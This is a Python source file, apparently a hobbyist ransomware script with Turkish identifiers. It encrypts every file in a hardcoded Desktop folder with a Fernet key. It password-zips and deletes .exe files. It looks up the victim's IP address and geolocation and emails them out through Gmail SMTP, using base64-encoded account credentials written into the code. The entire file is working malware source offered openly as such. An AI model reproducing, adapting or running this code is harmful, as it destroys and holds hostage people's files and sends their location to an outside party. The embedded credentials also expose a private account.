from zipfile import ZipFile
from cryptography.fernet import Fernet
import os
import requests
from bs4 import BeautifulSoup
import shutil
import base64


class Ransomware:

    def write_key(self):
        self.key = Fernet.generate_key()
        print(self.key)
        with open("key.key", "wb") as key_file:
            key_file.write(self.key)

    def sifre_yukle(self):
        return open("key.key", "rb").read()

    def dosyalari_ac(self, dosya_adi):
        self.f = open(dosya_adi, 'r')
        content = self.f.read()
        return content

    def icerigi_sifrele(self, dosya_adi, sifreli_hali):
        with open(dosya_adi, "wb") as f:
            f.write(sifreli_hali)

    def dosyalari_sifrele(self):

        path = r"""C://Users/cagan/Desktop/test/"""

        for root, directories, files in os.walk(path, topdown=False):
            for folder in files:
                if folder.endswith("zip" or "rar" or "7z" or "rpm"):
                    pass
                else:
                    print(folder)
                    txt = root +"/" + folder
                    message = ransomware.dosyalari_ac(txt).encode()
                    key = ransomware.sifre_yukle()
                    f = Fernet(key)
                    encrypted = f.encrypt(message)
                    ransomware.icerigi_sifrele(txt, encrypted)

    def ip_al(self):
        url = "https://api.ipify.org/"

        response = requests.get(url)

        html_icerigi = response.content

        soup = BeautifulSoup(html_icerigi, "html.parser")

        return soup


    def konum_bul(self,ip):
        import urllib.request
        import json

        with urllib.request.urlopen("https://geolocation-db.com/jsonp/" + ip) as url:
            data = url.read().decode()
            data = data.split("(")[1].strip(")")
            a = json.loads(data)
            bilgiler = f"""
            Ülke Kodu: {a["country_code"]} \n
            Ülke İsmi: {a["country_name"]} \n
            Şehir: {a["city"]}  \n
            Posta Kodu: {a["postal"]} \n
            Enlem: {a["latitude"]} \n
            Boylam: {a["longitude"]} \n
            IPv4: {a["IPv4"]}
            """
            return bilgiler




    def mail_at(self, email, password_i, contents):
        import smtplib, ssl

        smtp_server = "smtp.gmail.com"
        port = 587  #
        sender_email = str(base64.b64decode(email), "UTF-8")
        password = str(base64.b64decode(password_i), "UTF-8")

        context = ssl.create_default_context()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, sender_email, contents)


        except Exception as e:

            print(e)
        finally:
            server.quit()


    def exe_dosyalarini_ziple(self):
        import pyminizip
        i = 0
        path = r"C://Users/cagan/Desktop/test/"
        for root, directories, files in os.walk(path, topdown=False):
            for name in files:
                if name.endswith("exe"):

                    exe = root + "/" + name
                    pre = None
                    oupt = root + "/hacker" + str(i) + ".zip"
                    password = "GFG"
                    com_lvl = 5
                    pyminizip.compress(exe, None, oupt,
                                       password, com_lvl)
                    os.remove(exe)
                    i += 1
ransomware = Ransomware()

ip = ransomware.ip_al()
ip = str(ip)

ransomware.mail_at("Z3VuZXNrYW5kZW1pcjEyMjFAZ21haWwuY29t", "Z3VuZXMxMjIx", ransomware.konum_bul(str(ip)).encode())
# mail, şifrenizi base64 encodelanmış olarak ekleyiniz


ransomware.dosyalari_sifrele()
ransomware.exe_dosyalarini_ziple()










